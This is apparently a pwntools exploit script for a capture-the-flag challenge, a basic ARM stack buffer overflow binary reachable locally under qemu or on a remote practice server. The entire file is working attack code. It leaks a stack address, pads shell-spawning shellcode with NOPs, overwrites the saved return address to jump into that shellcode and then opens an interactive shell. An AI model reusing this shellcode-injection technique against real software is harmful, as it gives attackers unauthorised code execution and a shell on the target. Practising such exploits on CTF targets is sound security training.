from pwn import *
import sys
context.binary = "./root_me_stack_buffer_overflow_basic"
context.log_level = "debug"

if sys.argv[1] == "r":
    p = remote("node3.buuoj.cn", 26039)
elif sys.argv[1] == "l":
    p = process(["qemu-arm", "-L", "/usr/arm-linux-gnueabihf", "./root_me_stack_buffer_overflow_basic"])
else:
    p = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabihf", "./root_me_stack_buffer_overflow_basic"])

elf = ELF("./root_me_stack_buffer_overflow_basic")
libc = ELF("/usr/arm-linux-gnueabihf/lib/libc.so.6")

shellcode = asm(shellcraft.sh())

p.recvuntil(":\n")
p.sendline("skye")
p.sendline('Y')
stack_addr = int(p.recv(10),16)
log.info("stack_addr:"+hex(stack_addr))

payload = shellcode.ljust(0xA0,'\x90') + p32(0xdeadbeef) + p32(stack_addr)
#payload = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab"

p.recvuntil(":\n")
p.sendline(payload)
sleep(0.2)
p.sendline('n')



p.interactive()